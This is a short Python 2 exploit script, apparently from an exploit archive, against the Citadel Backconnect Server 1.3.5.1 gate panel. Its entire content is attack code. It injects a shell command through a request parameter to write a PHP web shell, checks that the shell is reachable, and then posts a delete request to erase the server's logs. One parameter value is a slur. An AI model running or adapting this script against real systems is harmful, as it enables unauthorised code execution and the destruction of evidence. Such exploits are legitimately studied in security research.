import urllib2

# Citadel Backconnect Server 1.3.5.1 Remote Code Execution vulnerability
# Work only on windows box 

def request(url, params=None, method=&#039;GET&#039;):
	if method == &#039;POST&#039;:
		urllib2.urlopen(url, urllib.urlencode(params)).read()
	elif method == &#039;GET&#039;:
		if params == None:
			urllib2.urlopen(url)
		else:
			urllib2.urlopen(url + &#039;?&#039; + urllib.urlencode(params)).read()

def uploadShell(url, filename, payload):
	data = {
		&#039;b&#039;  : &#039;tapz&#039;,
		&#039;p1&#039; : &#039;faggot&#039;,
		&#039;p2&#039; : &#039;hacker | echo "&#039; + payload + &#039;" >> &#039; + filename
	}
	request(url + &#039;test.php&#039;, data)

def shellExists(url):
	return urllib.urlopen(url).getcode() == 200
	
def cleanLogs(url):
	delete = {
		&#039;delete&#039; : &#039;&#039;
	}
	request(URL + &#039;control.php&#039;, delete, &#039;POST&#039;)

URL      = &#039;http://localhost/citadel/winserv_php_gate/&#039;
FILENAME = &#039;shell.php&#039;
PAYLOAD  = &#039;<?php phpinfo(); ?>&#039;

uploadShell(URL, FILENAME, PAYLOAD)
print &#039;[~] Shell created!&#039;
if not shellExists(URL + FILENAME):
	print &#039;[-]&#039;, FILENAME, &#039;not found...&#039;
else:
	print &#039;[+] Go to:&#039;, URL + FILENAME
cleanLogs(URL)
print &#039;[~] Logs cleaned!&#039;

